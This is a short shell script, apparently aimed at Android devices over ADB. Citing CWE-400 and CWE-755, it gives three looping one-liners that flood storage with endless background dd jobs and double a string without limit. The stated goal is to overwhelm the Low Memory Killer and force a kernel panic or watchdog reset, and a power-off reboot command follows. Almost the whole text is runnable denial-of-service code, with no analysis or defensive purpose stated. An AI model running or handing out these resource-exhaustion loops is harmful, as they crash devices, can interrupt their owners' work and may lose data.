# Using CWE 400 (Uncontrolled Resource Consumption) and CWE 755 (Improper Handling Of System Disruptions) to cause a Kernel Panic, and Watchdog Reset.

while :; do dd if=/dev/zero of=t_$RANDOM bs=4096 count=25000 & rm -f t_* 2>/dev/null; done # Spawns a bunch of Intenal Jobs and 
# Process ID's to crash the kernel (Kernel Panic). This is the slowest way by far to KP.


# Using the dd binary to overwhelm the Low Memory Killer, and crash the kernel, by appending special character strings. Also kinda slow.
while :; do dd if=/dev/zero of=t_$RANDOM bs=4096 count=25000 & rm -f t_* 2>/dev/null; X="AAAA"; while :; do X="$X$X$X$X$X$X$X$X$X$X"; done; done

# Stressing the LMK, and the Watchdog, to rigger the Watchdog Reset (Kernel Panic, that will probably kick your device off ADB for a bit.)
(while :; do dd if=/dev/zero of=t_$RANDOM bs=4096 count=25000 & rm -f t_* 2>/dev/null; done) & X="AAAA"; while :; do X="$X$X$X$X$X$X$X$X$X$X"; done

# Cold reboot (You're gonna need it!)
reboot -p
